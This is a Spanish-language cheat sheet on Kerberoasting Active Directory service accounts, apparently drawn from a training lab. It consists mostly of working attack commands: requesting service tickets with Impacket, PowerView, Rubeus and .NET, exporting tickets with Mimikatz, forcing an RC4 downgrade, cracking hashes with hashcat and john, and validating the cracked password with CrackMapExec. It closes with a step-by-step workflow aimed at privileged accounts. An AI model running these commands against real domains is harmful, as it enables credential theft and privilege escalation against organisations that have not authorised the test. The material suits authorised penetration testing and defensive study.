# 5. Kerberoasting

## ¿Qué es?

Kerberoasting solicita tickets TGS para cuentas con SPNs configurados. El TGS viene cifrado con la clave derivada de la contraseña de la cuenta de servicio, y se puede crackear offline. Las cuentas de servicio frecuentemente tienen contraseñas débiles y privilegios elevados, lo que hace que este ataque sea de alto impacto.

Para que funcione: el usuario que hace la solicitud solo necesita estar autenticado en el dominio. No necesita privilegios especiales.

---

## Desde Linux

### GetUserSPNs.py (Impacket)

```c
# Ver opciones disponibles
GetUserSPNs.py -h

# Listar cuentas con SPN
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Solicitar todos los TGS
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# TGS de un usuario específico
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Guardar hash directamente a archivo
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Cross-forest
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile tgs.txt
```

### Crackear con Hashcat

```c
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

El modo `13100` es para TGS-REP RC4 (etype 23). Si la cuenta usa AES usar modo `19700`.

### Verificar credencial

```c
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## Desde Windows — Método Manual

### Enumerar SPNs con setspn.exe

```c
setspn.exe -Q */*
setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
```

### Solicitar ticket para un SPN específico (.NET)

```c
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

El ticket queda en la caché de Kerberos de la sesión actual, visible con `klist`.

### Solicitar todos los tickets con setspn

```c
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Extraer tickets de memoria con Mimikatz

```c
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

### Convertir .kirbi a formato crackeable

```c
# kirbi2john: https://github.com/nidem/kerberoast
python2.7 kirbi2john.py sqldev.kirbi
kirbi2john sqldev.kirbi > crack_file

# Crackear con john
john --wordlist=/usr/share/wordlists/rockyou.txt crack_file

# O convertir para hashcat
echo "<base64 blob>" | tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
hashcat -m 13100 crack_file /usr/share/wordlists/rockyou.txt
```

## Desde Windows — PowerView

```c
Import-Module .\PowerView.ps1

# Listar cuentas con SPN
Get-DomainUser * -spn | select samaccountname

# Obtener TGS de una cuenta específica en formato Hashcat
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exportar todos los TGS a CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

## Desde Windows — Rubeus

- [Rubeus](https://github.com/GhostPack/Rubeus)

```c
# Ver estadísticas sin solicitar tickets
.\Rubeus.exe kerberoast /stats

# Kerberoast solo cuentas admin (admincount=1) — alto impacto
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Kerberoast un usuario específico
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Forzar RC4 aunque la cuenta soporte AES (más fácil de crackear)
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap

# Guardar a archivo
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

El flag `/nowrap` evita que el hash se parta en columnas, entregándolo listo para Hashcat. El flag `/tgtdeleg` fuerza RC4 (etype 23) incluso en cuentas con AES habilitado.

### Verificar tipo de cifrado que soporta la cuenta

```c
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Si `msds-supportedencryptiontypes` es `0` o está vacío → RC4 por defecto (fácil de crackear). Si es `24` → solo AES (mucho más lento de crackear).

### Hashcat modos

```c
# RC4 (etype 23) — más común y rápido
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# AES-256 (etype 18) — más lento
hashcat -m 19700 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Flujo recomendado

```
1. Listar SPNs y verificar si son cuentas privilegiadas (adminCount=1, Domain Admins)
2. Solicitar TGS con /nowrap para formato directo Hashcat
3. Si AES, usar /tgtdeleg para bajar a RC4
4. Crackear con hashcat -m 13100
5. Verificar credencial con CME
```
